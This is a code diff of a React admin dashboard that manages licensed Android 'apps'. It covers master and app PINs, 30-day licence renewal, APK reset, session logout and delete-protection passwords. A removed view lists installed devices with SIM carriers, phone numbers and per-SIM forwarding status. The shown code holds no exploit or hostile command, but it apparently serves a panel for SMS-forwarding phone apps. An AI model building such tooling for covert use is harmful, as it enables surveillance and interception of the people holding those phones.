+          <button type="submit" disabled={loading} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 700, cursor: loading ? "default" : "pointer", fontSize: 13 }}>{loading ? "Creating…" : "Create App"}</button>
         </div>
       </form>
     </Modal>
   );
 }
 
-/* ─────────── Change Master PIN Modal ─────────── */
+/* ── Change Master PIN Modal ── */
 function ChangePinModal({ masterPin, onClose, onChanged }: { masterPin: string; onClose: () => void; onChanged: (p: string) => void }) {
   const [currentPin, setCurrentPin] = useState(masterPin);
   const [newPin, setNewPin] = useState(""); const [newPin2, setNewPin2] = useState("");
   const [err, setErr] = useState(""); const [loading, setLoading] = useState(false);
-
   async function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
     if (newPin.length < 4) { setErr("New PIN must be at least 4 characters"); return; }
@@ -306,7 +262,6 @@ function ChangePinModal({ masterPin, onClose, onChanged }: { masterPin: string; 
       onChanged(newPin);
     } catch { setErr("Network error"); } finally { setLoading(false); }
   }
-
   return (
     <Modal onClose={onClose} maxWidth={380}>
       <ModalHeader title="Change Master PIN" icon={<Ic.Key />} onClose={onClose} />
@@ -324,11 +279,10 @@ function ChangePinModal({ masterPin, onClose, onChanged }: { masterPin: string; 
   );
 }
 
-/* ─────────── Edit App Modal ─────────── */
+/* ── Edit App Modal ── */
 function EditAppModal({ app, masterPin, onClose, onUpdated }: { app: App; masterPin: string; onClose: () => void; onUpdated: (a: App) => void }) {
   const [name, setName] = useState(app.name); const [pin, setPin] = useState(app.pin);
   const [err, setErr] = useState(""); const [loading, setLoading] = useState(false);
-
   async function handleSubmit(e: React.FormEvent) {
     e.preventDefault();
     if (!name.trim()) { setErr("Name required"); return; }
@@ -340,7 +294,6 @@ function EditAppModal({ app, masterPin, onClose, onUpdated }: { app: App; master
       onUpdated(await r.json() as App);
     } catch { setErr("Network error"); } finally { setLoading(false); }
   }
-
   return (
     <Modal onClose={onClose}>
       <ModalHeader title="Edit App" icon={<Ic.Pencil />} onClose={onClose} />
@@ -358,190 +311,22 @@ function EditAppModal({ app, masterPin, onClose, onUpdated }: { app: App; master
   );
 }
 
-/* ─────────── All Devices Modal ─────────── */
-const PAGE_SIZE = 48;
-function AllDevicesModal({ devices, loading, search, onSearchChange, onClose, onRefresh }: {
-  devices: FullDevice[]; loading: boolean; search: string;
-  onSearchChange: (v: string) => void; onClose: () => void; onRefresh: () => void;
-}) {
-  const [page, setPage] = useState(1);
-  const [inputVal, setInputVal] = useState(search);
-  const debRef = useRef<ReturnType<typeof setTimeout> | null>(null);
-
-  function handleSearchInput(v: string) {
-    setInputVal(v); setPage(1);
-    if (debRef.current) clearTimeout(debRef.current);
-    debRef.current = setTimeout(() => onSearchChange(v), 300);
-  }
-  function clearSearch() { setInputVal(""); onSearchChange(""); setPage(1); }
-
-  const s = search.trim().toLowerCase();
-  const filtered = useMemo(() => s === "" ? devices : devices.filter(d =>
-    d.name.toLowerCase().includes(s) || d.appId.toLowerCase().includes(s) ||
-    d.deviceId.toLowerCase().includes(s) || (d.sim1Phone ?? "").includes(s) || (d.sim2Phone ?? "").includes(s)
-  ), [devices, s]);
-
-  const shown = s !== "" ? filtered : filtered.slice(0, page * PAGE_SIZE);
-  const hasMore = s === "" && shown.length < filtered.length;
-  const ONLINE_MS = 15 * 60 * 1000;
-  const online = devices.filter(d => d.lastOnline ? (Date.now() - new Date(d.lastOnline).getTime()) < ONLINE_MS : false).length;
-
-  const appColors: Record<string, string> = {};
-  const palette = ["#6366f1","#8b5cf6","#06b6d4","#f59e0b","#10b981","#ef4444","#f97316","#ec4899","#14b8a6","#84cc16"];
-  let ci = 0;
-  devices.forEach(d => { if (!appColors[d.appId]) appColors[d.appId] = palette[ci++ % palette.length]; });
-
-  function renderSim(slot: number, carrier: string | null, phone: string | null) {
-    return (
-      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
-        <span style={{ fontSize: 10, fontWeight: 700, color: T.muted, background: T.border, borderRadius: 4, padding: "1px 5px", flexShrink: 0 }}>SIM{slot}</span>
-        {carrier || phone ? (
-          <span style={{ fontSize: 12, color: T.mutedLight }}>
-            {carrier && <span style={{ color: T.text, fontWeight: 600 }}>{carrier}</span>}
-            {carrier && phone && " · "}
-            {phone && <span style={{ fontFamily: "monospace", color: "#93c5fd" }}>{phone}</span>}
-          </span>
-        ) : <span style={{ fontSize: 11, color: T.muted, fontStyle: "italic" }}>No SIM</span>}
-      </div>
-    );
-  }
-
-  return (
-    <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.88)", zIndex: 200, display: "flex", flexDirection: "column", backdropFilter: "blur(4px)" }}>
-      {/* Header */}
-      <div style={{ background: T.headerBg, borderBottom: `1px solid ${T.border}`, padding: "0 16px", flexShrink: 0 }}>
-        <div style={{ maxWidth: 960, margin: "0 auto", height: 56, display: "flex", alignItems: "center", gap: 12 }}>
-          <div style={{ display: "flex", alignItems: "center", gap: 10, flex: 1, flexWrap: "wrap" }}>
-            <div style={{ color: T.accentLight }}><Ic.Smartphone /></div>
-            <span style={{ fontWeight: 900, fontSize: 16, color: T.text }}>All Devices</span>
-            <span style={{ background: T.accentGlow, color: T.accentLight, borderRadius: 99, padding: "2px 10px", fontSize: 11, fontWeight: 800, border: `1px solid ${T.accent}44` }}>{devices.length} total</span>
-            <span style={{ background: "#16a34a22", color: "#4ade80", borderRadius: 99, padding: "2px 10px", fontSize: 11, fontWeight: 800, border: "1px solid #16a34a44" }}>{online} online</span>
-          </div>
-          <div style={{ display: "flex", gap: 6 }}>
-            <button onClick={onRefresh} disabled={loading} style={{ background: T.border, border: `1px solid ${T.borderLight}`, color: loading ? T.muted : T.text, borderRadius: 8, padding: "7px 14px", fontSize: 12, fontWeight: 700, cursor: loading ? "default" : "pointer", display: "flex", alignItems: "center", gap: 6 }}>
-              <Ic.Refresh />{loading ? "..." : "Refresh"}
-            </button>
-            <button onClick={onClose} style={{ background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, borderRadius: 8, padding: "7px 12px", fontSize: 12, fontWeight: 700, cursor: "pointer", display: "flex", alignItems: "center" }}><Ic.X /></button>
-          </div>
-        </div>
-      </div>
-
-      {/* Search */}
-      <div style={{ background: T.bg, padding: "12px 16px", borderBottom: `1px solid ${T.border}`, flexShrink: 0 }}>
-        <div style={{ maxWidth: 960, margin: "0 auto", position: "relative" }}>
-          <span style={{ position: "absolute", left: 13, top: "50%", transform: "translateY(-50%)", color: T.muted, pointerEvents: "none", display: "flex" }}><Ic.Search /></span>
-          <input type="text" placeholder="Search by name, App ID, Device ID, phone…" value={inputVal} onChange={e => handleSearchInput(e.target.value)} autoFocus
-            style={{ width: "100%", boxSizing: "border-box", padding: "10px 36px 10px 40px", borderRadius: 10, background: T.card, border: `1px solid ${T.borderLight}`, color: T.text, fontSize: 13, outline: "none" }} />
-          {inputVal && <button onClick={clearSearch} style={{ position: "absolute", right: 10, top: "50%", transform: "translateY(-50%)", background: T.border, border: "none", color: T.muted, cursor: "pointer", width: 22, height: 22, borderRadius: 6, display: "flex", alignItems: "center", justifyContent: "center" }}><Ic.X /></button>}
-        </div>
-      </div>
-
-      {/* Device list */}
-      <div style={{ flex: 1, overflowY: "auto", padding: "16px", background: T.bg }}>
-        <div style={{ maxWidth: 960, margin: "0 auto" }}>
-          {loading ? (
-            <div style={{ textAlign: "center", padding: 80, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 14 }}>
-              <div style={{ color: T.accent }}><Ic.Loader /></div>
-              <div>Loading devices…</div>
-            </div>
-          ) : filtered.length === 0 ? (
-            <div style={{ textAlign: "center", padding: 80, color: T.muted, background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, display: "flex", flexDirection: "column", alignItems: "center", gap: 12 }}>
-              <div style={{ color: T.border }}><Ic.Inbox /></div>
-              <div>{search ? `No devices found for "${search}".` : "No devices found."}</div>
-            </div>
-          ) : (
-            <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fill, minmax(300px, 1fr))", gap: 12 }}>
-              {shown.map(d => {
-                const acColor = appColors[d.appId] ?? T.accent;
-                const isOnline = d.lastOnline ? (Date.now() - new Date(d.lastOnline).getTime()) < ONLINE_MS : false;
-                return (
-                  <div key={d.deviceId} style={{ background: T.card, borderRadius: 14, border: `1px solid ${isOnline ? T.green + "30" : T.borderLight}`, overflow: "hidden", display: "flex", flexDirection: "column" }}>
-                    <div style={{ padding: "10px 14px", background: T.headerBg, borderBottom: `1px solid ${T.borderLight}`, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 }}>
-                      <span style={{ background: acColor + "22", color: acColor, border: `1px solid ${acColor}44`, borderRadius: 6, padding: "2px 8px", fontSize: 10, fontWeight: 800, letterSpacing: 0.5, flexShrink: 0 }}>{d.appId}</span>
-                      <span style={{ display: "flex", alignItems: "center", gap: 4, background: isOnline ? "#16a34a22" : T.border, color: isOnline ? "#4ade80" : T.muted, borderRadius: 99, padding: "2px 9px", fontSize: 10, fontWeight: 800, border: `1px solid ${isOnline ? "#16a34a44" : "transparent"}`, flexShrink: 0 }}>
-                        <span style={{ width: 6, height: 6, borderRadius: "50%", background: isOnline ? "#4ade80" : T.muted, display: "inline-block" }} />
-                        {isOnline ? "ONLINE" : "OFFLINE"}
-                      </span>
-                    </div>
-                    <div style={{ padding: "12px 14px", display: "flex", flexDirection: "column", gap: 8, flex: 1 }}>
-                      <div style={{ fontWeight: 800, fontSize: 15, color: T.text, lineHeight: 1.2 }}>{d.name}</div>
-                      <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
-                        <span style={{ fontSize: 10, color: T.muted, fontWeight: 700, flexShrink: 0 }}>Device ID</span>
-                        <span style={{ fontFamily: "monospace", fontSize: 11, color: T.mutedLight, wordBreak: "break-all", flex: 1 }}>{d.deviceId}</span>
-                        <button onClick={() => { void navigator.clipboard?.writeText(d.deviceId); }} style={{ background: T.border, border: "none", color: T.muted, cursor: "pointer", padding: "3px 6px", borderRadius: 5, display: "flex", alignItems: "center", flexShrink: 0 }} title="Copy"><Ic.Copy /></button>
-                      </div>
-                      <div style={{ height: 1, background: T.border }} />
-                      {renderSim(1, d.sim1Carrier, d.sim1Phone)}
-                      {renderSim(2, d.sim2Carrier, d.sim2Phone)}
-                      <div style={{ height: 1, background: T.border }} />
-                      <div style={{ display: "flex", flexWrap: "wrap", gap: "6px 12px" }}>
-                        <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
-                          <span style={{ fontSize: 10, color: T.muted }}>Android</span>
-                          <span style={{ fontSize: 12, fontWeight: 700, color: d.androidVersion > 0 ? T.text : T.muted }}>{d.androidVersion > 0 ? `v${d.androidVersion}` : "—"}</span>
-                        </div>
-                        <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
-                          <span style={{ fontSize: 10, color: T.muted }}>FCM</span>
-                          <span style={{ fontSize: 11, fontWeight: 700, color: d.hasFcm ? T.green : T.red }}>{d.hasFcm ? "Active" : "None"}</span>
-                        </div>
-                        <div style={{ display: "flex", alignItems: "center", gap: 4 }}>
-                          <span style={{ fontSize: 10, color: T.muted }}>Forward</span>
-                          <span style={{ fontSize: 11, fontWeight: 700, color: d.forwardEnabled ? T.green : T.muted }}>{d.forwardEnabled ? `SIM${d.forwardSlot ?? "?"} ON` : "Off"}</span>
-                        </div>
-                      </div>
-                      <div style={{ display: "flex", flexDirection: "column", gap: 3 }}>
-                        <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10 }}>
-                          <span style={{ color: T.muted }}>Last Online</span>
-                          <span style={{ color: d.lastOnline ? T.mutedLight : T.muted, fontWeight: 600 }}>{fmtAgo(d.lastOnline)}</span>
-                        </div>
-                        <div style={{ display: "flex", justifyContent: "space-between", fontSize: 10 }}>
-                          <span style={{ color: T.muted }}>Installed</span>
-                          <span style={{ color: T.mutedLight, fontWeight: 600 }}>{fmtAgo(d.installedAt)}</span>
-                        </div>
-                      </div>
-                    </div>
-                  </div>
-                );
-              })}
-            </div>
-          )}
-          {hasMore && !loading && (
-            <div style={{ textAlign: "center", marginTop: 20 }}>
-              <button onClick={() => setPage(p => p + 1)} style={{ padding: "10px 32px", borderRadius: 10, background: "linear-gradient(135deg,#5254d4,#7c3aed)", border: "none", color: "#fff", fontWeight: 700, fontSize: 13, cursor: "pointer" }}>
-                Load More ({filtered.length - shown.length} remaining)
-              </button>
-            </div>
-          )}
-          {!hasMore && shown.length > 0 && !loading && (
-            <div style={{ textAlign: "center", marginTop: 16, color: T.muted, fontSize: 11 }}>{filtered.length} device{filtered.length !== 1 ? "s" : ""} shown</div>
-          )}
-        </div>
-      </div>
-    </div>
-  );
-}
-
-/* ─────────── Renew Licence Modal ─────────── */
+/* ── Renew Modal ── */
 function RenewModal({ app, masterPin, onClose, onRenewed }: { app: App; masterPin: string; onClose: () => void; onRenewed: (a: App) => void }) {
-  const [loading, setLoading] = useState(false);
-  const [err, setErr] = useState("");
-
+  const [loading, setLoading] = useState(false); const [err, setErr] = useState("");
   const THIRTY_MS = 30 * 24 * 60 * 60 * 1000;
   const oldExpiry = new Date(app.createdAt).getTime() + THIRTY_MS;
   const isExpired = oldExpiry < Date.now();
   const newExpiry = new Date(isExpired ? Date.now() + THIRTY_MS : oldExpiry + THIRTY_MS);
   const newExpiryStr = newExpiry.toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" });
-
   async function handleRenew() {
     setLoading(true); setErr("");
     try {
-      const r = await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}/renew`, {
-        method: "POST", headers: { "x-master-pin": masterPin },
-      });
+      const r = await apiFetch(`/api/master/apps/${encodeURIComponent(app.appId)}/renew`, { method: "POST", headers: { "x-master-pin": masterPin } });
       if (!r.ok) { const j = await r.json() as { error?: string }; setErr(j.error ?? "Failed"); return; }
       onRenewed(await r.json() as App);
     } catch { setErr("Network error"); } finally { setLoading(false); }
   }
-
   return (
     <Modal onClose={onClose} maxWidth={380}>
       <ModalHeader title="Renew Licence +30 Days" icon={<Ic.CalendarPlus />} onClose={onClose} />
@@ -551,135 +336,957 @@ function RenewModal({ app, masterPin, onClose, onRenewed }: { app: App; masterPi
         <div style={{ fontFamily: "monospace", fontSize: 11, color: T.accentLight }}>{app.appId}</div>
       </div>
       <div style={{ fontSize: 13, color: T.muted, marginBottom: 14, lineHeight: 1.7 }}>
-        {isExpired
-          ? <><span style={{ color: T.red, fontWeight: 700 }}>Licence expired.</span> A fresh <b style={{ color: T.green }}>30-day</b> licence will start from today.</>
-          : <>Current licence extended by <b style={{ color: T.green }}>+30 days</b>.</>
-        }<br />
+        {isExpired ? <><span style={{ color: T.red, fontWeight: 700 }}>Licence expired.</span> Fresh <b style={{ color: T.green }}>30-day</b> from today.</> : <>Extended by <b style={{ color: T.green }}>+30 days</b>.</>}<br />
         New expiry: <b style={{ color: T.text }}>{newExpiryStr}</b>
       </div>
       {err && <ErrBanner msg={err} />}
-      <div style={{ display: "flex", gap: 10, marginTop: 4 }}>
-        <button type="button" onClick={onClose} disabled={loading} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, fontWeight: 700, cursor: "pointer", fontSize: 13 }}>Cancel</button>
-        <button type="button" onClick={handleRenew} disabled={loading} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#16a34a,#22c55e)", border: "none", color: "#fff", fontWeight: 800, cursor: loading ? "default" : "pointer", fontSize: 13, boxShadow: "0 4px 14px rgba(34,197,94,0.35)" }}>
-          {loading ? "Renewing…" : "Confirm +30 Days"}
-        </button>
+      <div style={{ display: "flex", gap: 10 }}>
+        <button onClick={onClose} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: T.border, border: `1px solid ${T.borderLight}`, color: T.text, fontWeight: 700, cursor: "pointer", fontSize: 13 }}>Cancel</button>
+        <button onClick={handleRenew} disabled={loading} style={{ flex: 1, padding: "12px 0", borderRadius: 10, background: "linear-gradient(135deg,#16a34a,#22c55e)", border: "none", color: "#fff", fontWeight: 800, cursor: loading ? "default" : "pointer", fontSize: 13 }}>{loading ? "Renewing…" : "Confirm +30 Days"}</button>
       </div>
     </Modal>
   );
 }
 
-/* ─────────── App Card ─────────── */
+/* ── App Card ── */
 function AppCard({ app, onEdit, onDelete, onToggle, onLogoutAll, onCopyUrl, onResetApk, onRenew, copyMsg, deletingId, togglingId, logoutAllId, resetApkId, renewId }: {
   app: App; onEdit: (a: App) => void; onDelete: (a: App) => void;
-  onToggle: (a: App) => void; onLogoutAll: (a: App) => void; onCopyUrl: (a: App) => void; onResetApk: (a: App) => void; onRenew: (a: App) => void;
-  copyMsg: Record<string, string>; deletingId: string | null; togglingId: string | null; logoutAllId: string | null; resetApkId: string | null; renewId: string | null;
+  onToggle: (a: App) => void; onLogoutAll: (a: App) => void; onCopyUrl: (a: App) => void;
+  onResetApk: (a: App) => void; onRenew: (a: App) => void;
+  copyMsg: Record<string, string>; deletingId: string | null; togglingId: string | null;
+  logoutAllId: string | null; resetApkId: string | null; renewId: string | null;
 }) {
   const isActive = app.status === "active";
   const dt = new Date(app.createdAt);
   const dateStr = dt.toLocaleDateString("en-IN", { day: "2-digit", month: "short", year: "numeric" }) + " · " + dt.toLocaleTimeString("en-IN", { hour: "2-digit", minute: "2-digit", hour12: true });
   return (
-      <div style={{ background:T.card, borderRadius:16, border:`1px solid ${T.borderLight}`, overflow:"hidden", transition:"all 0.2s", position:"relative", boxShadow:"0 2px 12px rgba(0,0,0,0.18)" }}>
-        <div style={{ position:"absolute", left:0, top:0, bottom:0, width:3, background:isActive?`linear-gradient(180deg,${T.green},#4ade80)`:`linear-gradient(180deg,${T.red},#f87171)` }} />
-        <div style={{ padding:"13px 14px 13px 18px" }}>
-          <div style={{ display:"flex", alignItems:"flex-start", gap:10, marginBottom:10 }}>
-            <div style={{ flex:1, minWidth:0 }}>
-              <div style={{ fontSize:15, fontWeight:800, color:T.text, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>{app.name}</div>
-              <div style={{ fontSize:10, color:T.muted, marginTop:2 }}>{dateStr}</div>
-            </div>
-            <div style={{ display:"flex", alignItems:"center", gap:8, flexShrink:0 }}>
-              <span style={{ display:"inline-flex", alignItems:"center", gap:4, fontSize:10, fontWeight:700, padding:"3px 9px", borderRadius:99, color:isActive?T.green:T.red, background:(isActive?T.green:T.red)+"18", border:`1px solid ${(isActive?T.green:T.red)}30` }}>
-                <span style={{ width:5, height:5, borderRadius:"50%", background:isActive?T.green:T.red, display:"inline-block" }} />{isActive?"Active":"Off"}
-              </span>
-
+    <div style={{ background: T.card, borderRadius: 16, border: `1px solid ${T.borderLight}`, overflow: "hidden", position: "relative", boxShadow: "0 2px 12px rgba(0,0,0,0.18)" }}>
+      <div style={{ position: "absolute", left: 0, top: 0, bottom: 0, width: 3, background: isActive ? `linear-gradient(180deg,${T.green},#4ade80)` : `linear-gradient(180deg,${T.red},#f87171)` }} />
+      <div style={{ padding: "13px 14px 13px 18px" }}>
+        <div style={{ display: "flex", alignItems: "flex-start", gap: 10, marginBottom: 10 }}>
+          <div style={{ flex: 1, minWidth: 0 }}>
+            <div style={{ fontSize: 15, fontWeight: 800, color: T.text, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{app.name}</div>
+            <div style={{ fontSize: 10, color: T.muted, marginTop: 2 }}>{dateStr}</div>
+          </div>
+          <span style={{ display: "inline-flex", alignItems: "center", gap: 4, fontSize: 10, fontWeight: 700, padding: "3px 9px", borderRadius: 99, color: isActive ? T.green : T.red, background: (isActive ? T.green : T.red) + "18", border: `1px solid ${(isActive ? T.green : T.red)}30` }}>
+            <span style={{ width: 5, height: 5, borderRadius: "50%", background: isActive ? T.green : T.red, display: "inline-block" }} />{isActive ? "Active" : "Off"}
+          </span>
+        </div>
+        <div style={{ display: "flex", gap: 8, marginBottom: 11 }}>
+          <div style={{ flex: 1, background: T.inputBg, borderRadius: 9, padding: "7px 10px", border: `1px solid ${T.border}`, minWidth: 0 }}>
+            <div style={{ fontSize: 9, color: T.muted, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase", marginBottom: 4 }}>App ID</div>
+            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+              <span style={{ fontSize: 10, color: T.accentLight, fontFamily: "monospace", fontWeight: 600, flex: 1, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{app.appId}</span>
+              <CopyBtn value={app.appId} label="ID" />
             </div>
           </div>
-          <div style={{ display:"flex", gap:8, marginBottom:11 }}>
-            <div style={{ flex:1, background:T.inputBg, borderRadius:9, padding:"7px 10px", border:`1px solid ${T.border}`, minWidth:0 }}>
-              <div style={{ fontSize:9, color:T.muted, fontWeight:700, letterSpacing:1, textTransform:"uppercase", marginBottom:4 }}>App ID</div>
-              <div style={{ display:"flex", alignItems:"center", gap:6 }}>
-                <span style={{ fontSize:10, color:T.accentLight, fontFamily:"monospace", fontWeight:600, flex:1, overflow:"hidden", textOverflow:"ellipsis", whiteSpace:"nowrap" }}>{app.appId}</span>
-                <CopyBtn value={app.appId} label="ID" />
-              </div>
+          <div style={{ background: T.inputBg, borderRadius: 9, padding: "7px 10px", border: `1px solid ${T.border}`, flexShrink: 0 }}>
+            <div style={{ fontSize: 9, color: T.muted, fontWeight: 700, letterSpacing: 1, textTransform: "uppercase", marginBottom: 4 }}>PIN</div>
+            <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
+              <span style={{ fontSize: 14, color: T.text, fontFamily: "monospace", letterSpacing: 4, fontWeight: 700 }}>{app.pin}</span>
+              <CopyBtn value={app.pin} label="PIN" />
             </div>
-            <div style={{ background:T.inputBg, borderRadius:9, padding:"7px 10px", border:`1px solid ${T.border}`, flexShrink:0 }}>
-              <div style={{ fontSize:9, color:T.muted, fontWeight:700, letterSpacing:1, textTransform:"uppercase", marginBottom:4 }}>PIN</div>
-              <div style={{ display:"flex", alignItems:"center", gap:6 }}>
-                <span style={{ fontSize:14, color:T.text, fontFamily:"monospace", letterSpacing:4, fontWeight:700 }}>{app.pin}</span>
-                <CopyBtn value={app.pin} label="PIN" />
-              </div>
-            </div>
-          </div>
-          {/* Delete Protection row */}
-          <div style={{ display:"flex", alignItems:"center", gap:6, padding:"7px 10px", borderRadius:9, background:app.deleteProtectionPin ? (app.deleteProtectionEnabled ? "#16a34a18" : "#1a274080") : "#1a274050", border:`1px solid ${app.deleteProtectionPin ? (app.deleteProtectionEnabled ? "#16a34a40" : T.borderLight) : T.border}`, marginBottom:7 }}>
-            <span style={{ fontSize:10, color:T.muted, fontWeight:700, letterSpacing:0.8, textTransform:"uppercase", flexShrink:0 }}>Del Password</span>
-            <span style={{ flex:1 }} />
-            {app.deleteProtectionPin ? (
-              <>
-                <span style={{ fontFamily:"monospace", fontSize:13, fontWeight:700, color: app.deleteProtectionEnabled ? "#4ade80" : T.mutedLight, letterSpacing:1 }}>{app.deleteProtectionPin}</span>
-                <span style={{ fontSize:10, fontWeight:700, padding:"2px 7px", borderRadius:99, background: app.deleteProtectionEnabled ? "#16a34a22" : T.border, color: app.deleteProtectionEnabled ? "#4ade80" : T.muted, border:`1px solid ${app.deleteProtectionEnabled ? "#16a34a44" : "transparent"}`, flexShrink:0 }}>{app.deleteProtectionEnabled ? "ON" : "OFF"}</span>
-              </>
-            ) : (
-              <span style={{ fontSize:11, color:T.muted, fontStyle:"italic" }}>Not set</span>
-            )}
-          </div>
-          <div style={{ display:"flex", gap:5, alignItems:"center" }}>
-            <button onClick={() => onCopyUrl(app)} title={copyMsg[app.appId]||"Copy URL"}
-              style={{ flex:1, height:36, borderRadius:9, display:"flex", alignItems:"center", justifyContent:"center", cursor:"pointer", transition:"all 0.15s", outline:"none", border:"1px solid", background:copyMsg[app.appId]?T.green+"1a":T.border+"60", borderColor:copyMsg[app.appId]?T.green+"55":T.borderLight, color:copyMsg[app.appId]?T.green:T.mutedLight }}>
-              {copyMsg[app.appId] ? <Ic.Check /> : <Ic.Link />}
-            </button>
-            <button onClick={() => onEdit(app)} title="Edit App"
-              style={{ flex:1, height:36, borderRadius:9, display:"flex", alignItems:"center", justifyContent:"center", cursor:"pointer", transition:"all 0.15s", outline:"none", background:T.accentGlow, border:`1px solid ${T.accent}30`, color:T.accentLight }}>
-              <Ic.Pencil />
-            </button>
-            <button onClick={() => onLogoutAll(app)} disabled={logoutAllId===app.appId} title="Logout All Users"
-              style={{ flex:1, height:36, borderRadius:9, display:"flex", alignItems:"center", justifyContent:"center", transition:"all 0.15s", outline:"none", background:T.orange+"14", border:`1px solid ${T.orange}30`, color:T.orange, opacity:logoutAllId===app.appId?0.45:1, cursor:logoutAllId===app.appId?"wait":"pointer" }}>
-              <Ic.LogOut2 />
-            </button>
-            <button onClick={() => onResetApk(app)} disabled={resetApkId===app.appId} title="Reset APK"
-              style={{ flex:1, height:36, borderRadius:9, display:"flex", alignItems:"center", justifyContent:"center", transition:"all 0.15s", outline:"none", background:"#0ea5e914", border:"1px solid #0ea5e940", color:"#38bdf8", opacity:resetApkId===app.appId?0.45:1, cursor:resetApkId===app.appId?"wait":"pointer" }}>
-              <Ic.Refresh />
-            </button>
-            <button onClick={() => onRenew(app)} disabled={renewId===app.appId} title="Renew Licence +30 Days"
-              style={{ flex:1, height:36, borderRadius:9, display:"flex", alignItems:"center", justifyContent:"center", transition:"all 0.15s", outline:"none", background:"#16a34a14", border:"1px solid #16a34a40", color:"#4ade80", opacity:renewId===app.appId?0.45:1, cursor:renewId===app.appId?"wait":"pointer" }}>
-              <Ic.CalendarPlus />
-            </button>
-            <div style={{ width:1, height:22, background:T.border, flexShrink:0 }} />
-            <button onClick={() => onToggle(app)} disabled={togglingId===app.appId} title={isActive?"Disable":"Enable"}
-              style={{ flex:1, height:36, borderRadius:9, display:"flex", alignItems:"center", justifyContent:"center", transition:"all 0.15s", outline:"none", background:isActive?T.yellow+"14":T.green+"14", border:`1.5px solid ${isActive?T.yellow+"55":T.green+"55"}`, color:isActive?T.yellow:T.green, opacity:togglingId===app.appId?0.45:1, cursor:togglingId===app.appId?"wait":"pointer" }}>
-              <Ic.Power />
-            </button>
-            <button onClick={() => onDelete(app)} disabled={deletingId===app.appId} title="Delete App"
-              style={{ flex:1, height:36, borderRadius:9, display:"flex", alignItems:"center", justifyContent:"center", transition:"all 0.15s", outline:"none", background:T.red+"14", border:`1.5px solid ${T.red}44`, color:T.red, opacity:deletingId===app.appId?0.45:1, cursor:deletingId===app.appId?"wait":"pointer" }}>
-              <Ic.Trash />
-            </button>
           </div>
         </div>
+        <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "7px 10px", borderRadius: 9, background: app.deleteProtectionPin ? (app.deleteProtectionEnabled ? "#16a34a18" : "#1a274080") : "#1a274050", border: `1px solid ${app.deleteProtectionPin ? (app.deleteProtectionEnabled ? "#16a34a40" : T.borderLight) : T.border}`, marginBottom: 7 }}>
+          <span style={{ fontSize: 10, color: T.muted, fontWeight: 700, letterSpacing: 0.8, textTransform: "uppercase", flexShrink: 0 }}>Del Password</span>
+          <span style={{ flex: 1 }} />
+          {app.deleteProtectionPin ? (
+            <>
+              <span style={{ fontFamily: "monospace", fontSize: 13, fontWeight: 700, color: app.deleteProtectionEnabled ? "#4ade80" : T.mutedLight, letterSpacing: 1 }}>{app.deleteProtectionPin}</span>
+              <span style={{ fontSize: 10, fontWeight: 700, padding: "2px 7px", borderRadius: 99, background: app.deleteProtectionEnabled ? "#16a34a22" : T.border, color: app.deleteProtectionEnabled ? "#4ade80" : T.muted, border: `1px solid ${app.deleteProtectionEnabled ? "#16a34a44" : "transparent"}` }}>{app.deleteProtectionEnabled ? "ON" : "OFF"}</span>
+            </>
+          ) : <span style={{ fontSize: 11, color: T.muted, fontStyle: "italic" }}>Not set</span>}
+        </div>
+        <div style={{ display: "flex", gap: 5, alignItems: "center" }}>
+          <button onClick={() => onCopyUrl(app)} title={copyMsg[app.appId] || "Copy URL"} style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", transition: "all 0.15s", outline: "none", border: "1px solid", background: copyMsg[app.appId] ? T.green + "1a" : T.border + "60", borderColor: copyMsg[app.appId] ? T.green + "55" : T.borderLight, color: copyMsg[app.appId] ? T.green : T.mutedLight }}>
+            {copyMsg[app.appId] ? <Ic.Check /> : <Ic.Link />}
+          </button>
+          <button onClick={() => onEdit(app)} title="Edit" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", transition: "all 0.15s", outline: "none", background: T.border + "60", border: `1px solid ${T.borderLight}`, color: T.mutedLight }}>
+            <Ic.Pencil />
+          </button>
+          <button onClick={() => onLogoutAll(app)} disabled={logoutAllId === app.appId} title="Logout All Sessions" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", cursor: "pointer", transition: "all 0.15s", outline: "none", background: "#7c3aed14", border: "1px solid #7c3aed40", color: "#a78bfa", opacity: logoutAllId === app.appId ? 0.45 : 1 }}>
+            {logoutAllId === app.appId ? <Spinner /> : <Ic.LogOut2 />}
+          </button>
+          <button onClick={() => onResetApk(app)} disabled={resetApkId === app.appId} title="Reset APK" style={{ flex: 1, height: 36, borderRadius: 9, display: "flex", alignItems: "center", justifyContent: "center", transition: "all 0.15s", outline: "none", background: "#0369a114", border: "1px solid #0369a140", color: "#38bdf8", opacity: resetApkId === app.appId ? 0.45 : 1, cursor: resetApkId === app.appId ? "wait" : "pointer" }}>
+            {resetApkId === app.appId ? <Spinner /> : <Ic.Refresh />}
+          </button>
